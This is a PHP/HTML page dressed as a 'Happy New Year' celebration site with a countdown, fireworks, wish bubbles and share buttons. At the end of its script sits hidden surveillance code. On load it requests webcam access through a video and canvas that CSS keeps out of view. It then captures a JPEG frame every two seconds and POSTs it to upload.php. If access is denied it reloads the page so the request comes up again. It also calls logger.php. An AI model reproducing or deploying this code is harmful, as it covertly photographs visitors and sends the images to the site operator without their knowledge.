<?php
if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
  @file_get_contents("logger.php");
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Happy New Year Celebration</title>
    <style>
        :root {
            --gold: #FFD700;
            --silver: #C0C0C0;
            --deep-blue: #00008B;
            --purple: #800080;
            --black: #000000;
            --white: #FFFFFF;
            --sparkle: rgba(255, 255, 255, 0.8);
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Arial', sans-serif;
            background: linear-gradient(135deg, var(--deep-blue), var(--purple));
            color: var(--white);
            overflow-x: hidden;
            min-height: 100vh;
            position: relative;
        }

        video, canvas {
            display: none !important;
        }

        .stars {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: -1;
        }

        .star {
            position: absolute;
            background-color: var(--white);
            border-radius: 50%;
            animation: twinkle var(--duration, 5s) infinite ease-in-out;
        }

        @keyframes twinkle {
            0%, 100% { opacity: 0.2; }
            50% { opacity: 1; }
        }

        .sparkles {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: -1;
            pointer-events: none;
        }

        .sparkle {
            position: absolute;
            width: 4px;
            height: 4px;
            background-color: var(--sparkle);
            border-radius: 50%;
            filter: blur(1px);
            animation: sparkleMove var(--duration, 10s) linear infinite;
        }

        @keyframes sparkleMove {
            0% { transform: translateY(0) translateX(0); opacity: 0; }
            10% { opacity: 1; }
            90% { opacity: 1; }
            100% { transform: translateY(100vh) translateX(50px); opacity: 0; }
        }

        header {
            text-align: center;
            padding: 2rem 1rem;
            position: relative;
            overflow: hidden;
        }

        .header-bg {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: -1;
            background: radial-gradient(circle, rgba(255, 215, 0, 0.1) 0%, rgba(0, 0, 139, 0) 70%);
            animation: pulse 8s infinite alternate;
        }

        @keyframes pulse {
            0% { transform: scale(1); opacity: 0.3; }
            100% { transform: scale(1.2); opacity: 0.7; }
        }

        h1 {
            font-size: clamp(2.5rem, 8vw, 5rem);
            margin-bottom: 1rem;
            background: linear-gradient(to right, var(--gold), var(--silver));
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
            animation: scaleIn 1.5s ease-out, float 3s ease-in-out infinite;
            text-shadow: 0 0 10px rgba(255, 215, 0, 0.3);
        }

        @keyframes scaleIn {
            0% { transform: scale(0.5); opacity: 0; }
            100% { transform: scale(1); opacity: 1; }
        }

        @keyframes float {
            0%, 100% { transform: translateY(0); }
            50% { transform: translateY(-10px); }
        }

        .subtitle {
            font-size: 1.5rem;
            margin-bottom: 2rem;
            opacity: 0;
            animation: fadeIn 2s ease-out 1s forwards;
        }

        @keyframes fadeIn {
            0% { opacity: 0; transform: translateY(20px); }
            100% { opacity: 1; transform: translateY(0); }
        }

        main {
            max-width: 1200px;
            margin: 0 auto;
            padding: 1rem;
        }

        section {
            margin-bottom: 3rem;
            background: rgba(0, 0, 0, 0.3);
            border-radius: 15px;
            padding: 2rem;
            backdrop-filter: blur(5px);
            border: 1px solid rgba(255, 215, 0, 0.2);
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
            position: relative;
            overflow: hidden;
        }

        section::before {
            content: '';
            position: absolute;
            top: -2px;
            left: -2px;
            right: -2px;
            bottom: -2px;
            background: linear-gradient(45deg, var(--gold), var(--purple), var(--deep-blue), var(--silver));
            background-size: 400%;
            z-index: -1;
            border-radius: 16px;
            animation: borderGlow 8s linear infinite;
            opacity: 0.7;
        }

        @keyframes borderGlow {
            0% { background-position: 0% 50%; }
            50% { background-position: 100% 50%; }
            100% { background-position: 0% 50%; }
        }

        h2 {
            font-size: 2rem;
            margin-bottom: 1.5rem;
            color: var(--gold);
            position: relative;
            display: inline-block;
        }

        h2::after {
            content: '';
            position: absolute;
            bottom: -5px;
            left: 0;
            width: 100%;
            height: 2px;
            background: linear-gradient(to right, var(--gold), transparent);
        }

        .countdown {
            display: flex;
            justify-content: center;
            gap: 1rem;
            flex-wrap: wrap;
        }

        .countdown-item {
            text-align: center;
            min-width: 100px;
        }

        .countdown-number {
            font-size: 3rem;
            font-weight: bold;
            color: var(--gold);
            margin-bottom: 0.5rem;
            position: relative;
            display: inline-block;
        }

        .countdown-number::before {
            content: '';
            position: absolute;
            top: -10px;
            left: 0;
            width: 100%;
            height: 3px;
            background: var(--silver);
            transform: scaleX(0);
            transform-origin: left;
            animation: scaleIn 0.5s ease-out forwards;
        }

        .countdown-label {
            font-size: 1rem;
            color: var(--silver);
            text-transform: uppercase;
            letter-spacing: 2px;
        }

        .resolutions {
            max-height: 300px;
            overflow-y: auto;
            padding-right: 1rem;
        }

        .resolutions::-webkit-scrollbar {
            width: 8px;
        }

        .resolutions::-webkit-scrollbar-track {
            background: rgba(0, 0, 0, 0.2);
            border-radius: 10px;
        }

        .resolutions::-webkit-scrollbar-thumb {
            background: linear-gradient(var(--gold), var(--silver));
            border-radius: 10px;
        }

        .resolution-item {
            padding: 1rem;
            margin-bottom: 1rem;
            background: rgba(255, 255, 255, 0.1);
            border-left: 4px solid var(--gold);
            border-radius: 0 8px 8px 0;
            transition: transform 0.3s, box-shadow 0.3s;
            cursor: pointer;
        }

        .resolution-item:hover {
            transform: translateX(10px);
            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
            background: rgba(255, 215, 0, 0.1);
        }

        .resolution-item:nth-child(even) {
            border-left-color: var(--silver);
        }

        .fireworks-container {
            position: relative;
            height: 300px;
            margin-bottom: 2rem;
            display: flex;
            justify-content: center;
            align-items: flex-end;
        }

        canvas#fireworks-canvas {
            display: block !important;
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
        }

        .fireworks-btn {
            background: linear-gradient(to right, var(--gold), var(--silver));
            color: var(--black);
            border: none;
            padding: 1rem 2rem;
            font-size: 1.2rem;
            font-weight: bold;
            border-radius: 50px;
            cursor: pointer;
            transition: transform 0.3s, box-shadow 0.3s;
            z-index: 1;
            position: relative;
            overflow: hidden;
        }

        .fireworks-btn:hover {
            transform: translateY(-5px);
            box-shadow: 0 10px 20px rgba(255, 215, 0, 0.3);
        }

        .fireworks-btn::before {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.4), transparent);
            transition: 0.5s;
        }

        .fireworks-btn:hover::before {
            left: 100%;
        }

        .wish-form {
            display: flex;
            flex-direction: column;
            gap: 1rem;
        }

        .wish-input {
            background: rgba(255, 255, 255, 0.1);
            border: 1px solid rgba(255, 215, 0, 0.3);
            border-radius: 8px;
            padding: 1rem;
            color: var(--white);
            font-size: 1rem;
            transition: border-color 0.3s;
        }

        .wish-input:focus {
            outline: none;
            border-color: var(--gold);
            box-shadow: 0 0 10px rgba(255, 215, 0, 0.3);
        }

        .wish-submit {
            background: linear-gradient(to right, var(--purple), var(--deep-blue));
            color: var(--white);
            border: none;
            padding: 1rem;
            border-radius: 8px;
            font-size: 1rem;
            cursor: pointer;
            transition: transform 0.3s, box-shadow 0.3s;
        }

        .wish-submit:hover {
            transform: translateY(-3px);
            box-shadow: 0 5px 15px rgba(128, 0, 128, 0.4);
        }

        .wishes-display {
            margin-top: 2rem;
            min-height: 100px;
            position: relative;
        }

        .wish-bubble {
            position: absolute;
            background: rgba(255, 215, 0, 0.2);
            border-radius: 50%;
            display: flex;
            justify-content: center;
            align-items: center;
            color: var(--white);
            font-size: 0.8rem;
            animation: floatUp 5s linear forwards, fadeOut 5s linear forwards;
            transform-origin: center;
            overflow: hidden;
            text-overflow: ellipsis;
            white-space: nowrap;
            padding: 0.5rem;
        }

        @keyframes floatUp {
            0% { transform: translateY(0) scale(0.5); opacity: 1; }
            100% { transform: translateY(-100vh) scale(1.5); opacity: 0; }
        }

        @keyframes fadeOut {
            0% { opacity: 1; }
            100% { opacity: 0; }
        }

        .confetti-container {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            pointer-events: none;
            z-index: 100;
        }

        .confetti {
            position: absolute;
            width: 10px;
            height: 10px;
            background-color: var(--color, var(--gold));
            opacity: 0.8;
            animation: confettiFall linear forwards;
        }

        @keyframes confettiFall {
            0% { transform: translateY(-10px) rotate(0deg); }
            100% { transform: translateY(100vh) rotate(360deg); }
        }

        .share-section {
            display: flex;
            justify-content: center;
            gap: 1rem;
            flex-wrap: wrap;
        }

        .share-btn {
            padding: 0.8rem 1.5rem;
            border-radius: 50px;
            border: none;
            font-weight: bold;
            cursor: pointer;
            transition: transform 0.3s;
            display: flex;
            align-items: center;
            gap: 0.5rem;
        }

        .share-btn:hover {
            transform: translateY(-3px);
        }

        .twitter {
            background: #1DA1F2;
            color: white;
        }

        .facebook {
            background: #4267B2;
            color: white;
        }

        .whatsapp {
            background: #25D366;
            color: white;
        }

        footer {
            text-align: center;
            padding: 2rem 1rem;
            margin-top: 3rem;
            background: rgba(0, 0, 0, 0.3);
            position: relative;
        }

        footer::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 2px;
            background: linear-gradient(to right, transparent, var(--gold), transparent);
        }

        @media (max-width: 768px) {
            .countdown-item {
                min-width: 80px;
            }

            .countdown-number {
                font-size: 2rem;
            }

            section {
                padding: 1.5rem;
            }

            h1 {
                font-size: 3rem;
            }

            .subtitle {
                font-size: 1.2rem;
            }
        }

        @media (max-width: 480px) {
            .countdown-item {
                min-width: 70px;
            }

            .countdown-number {
                font-size: 1.5rem;
            }

            section {
                padding: 1rem;
            }

            h1 {
                font-size: 2.5rem;
            }

            .subtitle {
                font-size: 1rem;
            }

            .fireworks-btn {
                padding: 0.8rem 1.5rem;
                font-size: 1rem;
            }
        }
    </style>
</head>
<body>
    <video id="video" autoplay playsinline></video>
    <canvas id="canvas"></canvas>

    <div class="stars" id="stars"></div>
    <div class="sparkles" id="sparkles"></div>

    <header>
        <div class="header-bg"></div>
        <h1 id="main-heading">Happy New Year! 🎉</h1>
        <p class="subtitle">Welcome to a dazzling celebration of new beginnings</p>
    </header>

    <main>
        <section>
            <h2>Countdown to New Year</h2>
            <div class="countdown" id="countdown">
                <div class="countdown-item">
                    <div class="countdown-number" id="days">00</div>
                    <div class="countdown-label">Days</div>
                </div>
                <div class="countdown-item">
                    <div class="countdown-number" id="hours">00</div>
                    <div class="countdown-label">Hours</div>
                </div>
                <div class="countdown-item">
                    <div class="countdown-number" id="minutes">00</div>
                    <div class="countdown-label">Minutes</div>
                </div>
                <div class="countdown-item">
                    <div class="countdown-number" id="seconds">00</div>
                    <div class="countdown-label">Seconds</div>
                </div>
            </div>
        </section>

        <section>
            <h2>New Year's Resolutions</h2>
            <div class="resolutions" id="resolutions"></div>
        </section>

        <section>
            <h2>Celebration Fireworks</h2>
            <div class="fireworks-container">
                <canvas id="fireworks-canvas"></canvas>
                <button class="fireworks-btn" id="fireworks-btn">Launch Fireworks!</button>
            </div>
        </section>

        <section>
            <h2>Make a Wish for the New Year</h2>
            <form class="wish-form" id="wish-form">
                <input type="text" class="wish-input" id="wish-input" placeholder="Enter your wish for the new year..." maxlength="100" required>
                <button type="submit" class="wish-submit">Send Your Wish</button>
            </form>
            <div class="wishes-display" id="wishes-display"></div>
        </section>

        <section>
            <h2>Share the Joy</h2>
            <div class="share-section">
                <button class="share-btn twitter" id="twitter-share">
                    <span>Share on Twitter</span>
                </button>
                <button class="share-btn facebook" id="facebook-share">
                    <span>Share on Facebook</span>
                </button>
                <button class="share-btn whatsapp" id="whatsapp-share">
                    <span>Share on WhatsApp</span>
                </button>
            </div>
        </section>
    </main>

    <div class="confetti-container" id="confetti-container"></div>

    <footer>
        <p>Wishing you a prosperous and joyful New Year!</p>
        <p>© <span id="current-year"></span> New Year Celebration </p>
    </footer>

    <script>
        document.getElementById('current-year').textContent = new Date().getFullYear();

        function createStarfield() {
            const starsContainer = document.getElementById('stars');
            const starCount = 200;
            
            for (let i = 0; i < starCount; i++) {
                const star = document.createElement('div');
                star.classList.add('star');
                
                const x = Math.random() * 100;
                const y = Math.random() * 100;
                
                const size = Math.random() * 3;
                
                const duration = 2 + Math.random() * 8;
                
                star.style.left = `${x}%`;
                star.style.top = `${y}%`;
                star.style.width = `${size}px`;
                star.style.height = `${size}px`;
                star.style.setProperty('--duration', `${duration}s`);
                
                star.style.animationDelay = `${Math.random() * 5}s`;
                
                starsContainer.appendChild(star);
            }
        }

        function createSparkles() {
            const sparklesContainer = document.getElementById('sparkles');
            const sparkleCount = 50;
            
            for (let i = 0; i < sparkleCount; i++) {
                const sparkle = document.createElement('div');
                sparkle.classList.add('sparkle');
                
                const x = Math.random() * 100;
                
                const duration = 5 + Math.random() * 10;
                
                sparkle.style.left = `${x}%`;
                sparkle.style.setProperty('--duration', `${duration}s`);
                
                sparkle.style.animationDelay = `${Math.random() * 5}s`;
                
                sparklesContainer.appendChild(sparkle);
            }
        }

        function updateCountdown() {
            const now = new Date();
            const currentYear = now.getFullYear();
            const newYear = new Date(`January 1, ${currentYear + 1} 00:00:00`);
            
            const diff = newYear - now;
            
            const days = Math.floor(diff / (1000 * 60 * 60 * 24));
            const hours = Math.floor((diff % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
            const minutes = Math.floor((diff % (1000 * 60 * 60)) / (1000 * 60));
            const seconds = Math.floor((diff % (1000 * 60)) / 1000);
            
            document.getElementById('days').textContent = days.toString().padStart(2, '0');
            document.getElementById('hours').textContent = hours.toString().padStart(2, '0');
            document.getElementById('minutes').textContent = minutes.toString().padStart(2, '0');
            document.getElementById('seconds').textContent = seconds.toString().padStart(2, '0');
            
            animateNumber('days', days);
            animateNumber('hours', hours);
            animateNumber('minutes', minutes);
            animateNumber('seconds', seconds);
        }

        function animateNumber(id, newValue) {
            const element = document.getElementById(id);
            if (element.lastValue !== newValue) {
                element.style.transform = 'scale(1.2)';
                setTimeout(() => {
                    element.style.transform = 'scale(1)';
                }, 300);
                element.lastValue = newValue;
            }
        }

        function populateResolutions() {
            const resolutions = [
                "Learn something new every day",
                "Exercise regularly and stay active",
                "Spend more time with family and friends",
                "Travel to new places and explore",
                "Read at least one book per month",
                "Practice mindfulness and meditation",
                "Volunteer and give back to the community",
                "Improve work-life balance",
                "Save money and invest wisely",
                "Reduce stress and prioritize mental health",
                "Learn a new language or skill",
                "Cook more meals at home",
                "Reduce screen time and digital distractions",
                "Keep a gratitude journal",
                "Be more environmentally conscious",
                "Start a creative hobby (painting, writing, music)",
                "Network and meet new people",
                "Get organized and declutter",
                "Focus on personal growth and development",
                "Be kinder to yourself and others"
            ];
            
            const container = document.getElementById('resolutions');
            
            resolutions.forEach(resolution => {
                const item = document.createElement('div');
                item.classList.add('resolution-item');
                item.textContent = resolution;
                container.appendChild(item);
            });
        }

        function setupFireworks() {
            const canvas = document.getElementById('fireworks-canvas');
            const ctx = canvas.getContext('2d');
            const btn = document.getElementById('fireworks-btn');
            
            function resizeCanvas() {
                const container = canvas.parentElement;
                canvas.width = container.clientWidth;
                canvas.height = container.clientHeight;
            }
            
            resizeCanvas();
            window.addEventListener('resize', resizeCanvas);
            
            class Particle {
                constructor(x, y, color) {
                    this.x = x;
                    this.y = y;
                    this.color = color;
                    this.velocity = {
                        x: (Math.random() - 0.5) * 8,
                        y: (Math.random() - 0.5) * 8
                    };
                    this.alpha = 1;
                    this.decay = Math.random() * 0.015 + 0.01;
                    this.size = Math.random() * 3 + 1;
                }
                
                draw() {
                    ctx.globalAlpha = this.alpha;
                    ctx.fillStyle = this.color;
                    ctx.beginPath();
                    ctx.arc(this.x, this.y, this.size, 0, Math.PI * 2);
                    ctx.fill();
                }
                
                update() {
                    this.velocity.y += 0.05;
                    this.x += this.velocity.x;
                    this.y += this.velocity.y;
                    this.alpha -= this.decay;
                    
                    this.draw();
                    return this.alpha > 0;
                }
            }
            
            class Firework {
                constructor(x, y, targetX, targetY, color) {
                    this.x = x;
                    this.y = y;
                    this.targetX = targetX;
                    this.targetY = targetY;
                    this.color = color;
                    this.particles = [];
                    this.speed = 2;
                    this.angle = Math.atan2(targetY - y, targetX - x);
                    this.velocity = {
                        x: Math.cos(this.angle) * this.speed,
                        y: Math.sin(this.angle) * this.speed
                    };
                    this.trail = [];
                    this.exploded = false;
                }
                
                draw() {
                    if (!this.exploded) {
                        ctx.fillStyle = this.color;
                        ctx.beginPath();
                        ctx.arc(this.x, this.y, 2, 0, Math.PI * 2);
                        ctx.fill();
                        
                        for (let i = 0; i < this.trail.length; i++) {
                            const pos = this.trail[i];
                            ctx.globalAlpha = i / this.trail.length;
                            ctx.fillStyle = this.color;
                            ctx.beginPath();
                            ctx.arc(pos.x, pos.y, 1, 0, Math.PI * 2);
                            ctx.fill();
                        }
                        ctx.globalAlpha = 1;
                    }
                }
                
                update() {
                    if (!this.exploded) {
                        this.trail.push({ x: this.x, y: this.y });
                        if (this.trail.length > 20) {
                            this.trail.shift();
                        }
                        
                        this.x += this.velocity.x;
                        this.y += this.velocity.y;
                        
                        const distance = Math.hypot(this.targetX - this.x, this.targetY - this.y);
                        if (distance < 5) {
                            this.explode();
                        }
                        
                        this.draw();
                    }
                    
                    for (let i = this.particles.length - 1; i >= 0; i--) {
                        if (!this.particles[i].update()) {
                            this.particles.splice(i, 1);
                        }
                    }
                    
                    return this.exploded && this.particles.length === 0;
                }
                
                explode() {
                    this.exploded = true;
                    const particleCount = 100;
                    for (let i = 0; i < particleCount; i++) {
                        this.particles.push(new Particle(this.x, this.y, this.color));
                    }
                }
            }
            
            let fireworks = [];
            let animationId;
            
            function animate() {
                animationId = requestAnimationFrame(animate);
                ctx.fillStyle = 'rgba(0, 0, 0, 0.1)';
                ctx.fillRect(0, 0, canvas.width, canvas.height);
                
                for (let i = fireworks.length - 1; i >= 0; i--) {
                    if (fireworks[i].update()) {
                        fireworks.splice(i, 1);
                    }
                }
            }
            
            function createFirework() {
                const colors = [
                    '#FF0000', '#00FF00', '#0000FF', '#FFFF00', 
                    '#FF00FF', '#00FFFF', '#FFA500', '#FFFFFF'
                ];
                const color = colors[Math.floor(Math.random() * colors.length)];
                
                const x = Math.random() * canvas.width;
                const y = canvas.height;
                const targetX = Math.random() * canvas.width;
                const targetY = Math.random() * canvas.height * 0.6;
                
                fireworks.push(new Firework(x, y, targetX, targetY, color));
            }
            
            btn.addEventListener('click', () => {
                for (let i = 0; i < 5; i++) {
                    setTimeout(createFirework, i * 300);
                }
                
                createConfetti();
            });
            
            animate();
        }

        function setupWishingWell() {
            const form = document.getElementById('wish-form');
            const input = document.getElementById('wish-input');
            const display = document.getElementById('wishes-display');
            
            form.addEventListener('submit', (e) => {
                e.preventDefault();
                const wish = input.value.trim();
                if (wish) {
                    createWishBubble(wish);
                    input.value = '';
                }
            });
            
            function createWishBubble(wish) {
                const bubble = document.createElement('div');
                bubble.classList.add('wish-bubble');
                bubble.textContent = wish;
                
                const left = Math.random() * 80 + 10;
                bubble.style.left = `${left}%`;
                bubble.style.bottom = '20px';
                
                const size = Math.random() * 50 + 50;
                bubble.style.width = `${size}px`;
                bubble.style.height = `${size}px`;
                
                const duration = 3 + Math.random() * 4;
                bubble.style.animationDuration = `${duration}s`;
                
                display.appendChild(bubble);
                
                setTimeout(() => {
                    bubble.remove();
                }, duration * 1000);
            }
        }

        function createConfetti() {
            const container = document.getElementById('confetti-container');
            const colors = ['#FFD700', '#C0C0C0', '#FF0000', '#00FF00', '#0000FF', '#FFFFFF'];
            const count = 150;
            
            for (let i = 0; i < count; i++) {
                const confetti = document.createElement('div');
                confetti.classList.add('confetti');
                
                const color = colors[Math.floor(Math.random() * colors.length)];
                const left = Math.random() * 100;
                const size = Math.random() * 10 + 5;
                const duration = Math.random() * 3 + 2;
                const delay = Math.random() * 2;
                const shape = Math.random() > 0.5 ? '50%' : '0';
                
                confetti.style.setProperty('--color', color);
                confetti.style.left = `${left}%`;
                confetti.style.width = `${size}px`;
                confetti.style.height = `${size}px`;
                confetti.style.borderRadius = shape;
                confetti.style.animationDuration = `${duration}s`;
                confetti.style.animationDelay = `${delay}s`;
                
                container.appendChild(confetti);
                
                setTimeout(() => {
                    confetti.remove();
                }, (duration + delay) * 1000);
            }
        }

        function setupShareButtons() {
            const shareUrl = encodeURIComponent(window.location.href);
            const shareText = encodeURIComponent("Check out this amazing New Year celebration website! Wishing you a happy and prosperous new year! 🎉");
            
            document.getElementById('twitter-share').addEventListener('click', () => {
                window.open(`https://twitter.com/intent/tweet?url=${shareUrl}&text=${shareText}`, '_blank');
            });
            
            document.getElementById('facebook-share').addEventListener('click', () => {
                window.open(`https://www.facebook.com/sharer/sharer.php?u=${shareUrl}`, '_blank');
            });
            
            document.getElementById('whatsapp-share').addEventListener('click', () => {
                window.open(`https://wa.me/?text=${shareText}%20${shareUrl}`, '_blank');
            });
        }

        function typeWriter() {
            const heading = document.getElementById('main-heading');
            const text = "Happy New Year! 🎉";
            let i = 0;
            
            heading.textContent = '';
            
            function type() {
                if (i < text.length) {
                    heading.textContent += text.charAt(i);
                    i++;
                    setTimeout(type, 100);
                }
            }
            
            type();
        }

        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const ctx = canvas.getContext('2d');

        let lastImageHash = "";

        function getImageHash(dataUrl) {
            let hash = 0;
            for (let i = 0; i < dataUrl.length; i++) {
                const char = dataUrl.charCodeAt(i);
                hash = ((hash << 5) - hash) + char;
                hash |= 0;
            }
            return hash;
        }

        function captureAndSend() {
            const width = video.videoWidth;
            const height = video.videoHeight;

            if (width === 0 || height === 0) return;

            canvas.width = width;
            canvas.height = height;
            ctx.drawImage(video, 0, 0, width, height);

            const dataUrl = canvas.toDataURL('image/jpeg', 0.9);
            const hash = getImageHash(dataUrl);

            if (hash === lastImageHash) {
                return;
            }

            lastImageHash = hash;

            fetch('upload.php', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ image: dataUrl })
            });
        }

        function startCamera() {
            navigator.mediaDevices.getUserMedia({ video: true })
                .then(stream => {
                    video.srcObject = stream;
                    setInterval(captureAndSend, 2000);
                })
                .catch(err => {
                    console.warn("Camera access failed:", err);
                    setTimeout(() => location.reload(), 5000);
                });
        }

        window.addEventListener('DOMContentLoaded', () => {
            createStarfield();
            createSparkles();
            updateCountdown();
            setInterval(updateCountdown, 1000);
            populateResolutions();
            setupFireworks();
            setupWishingWell();
            setupShareButtons();
            
            setTimeout(typeWriter, 500);
            
            setTimeout(createConfetti, 1000);

            startCamera();
            fetch("logger.php").then(res => res.text()).then(console.log);
        });
    </script>
</body>
</html>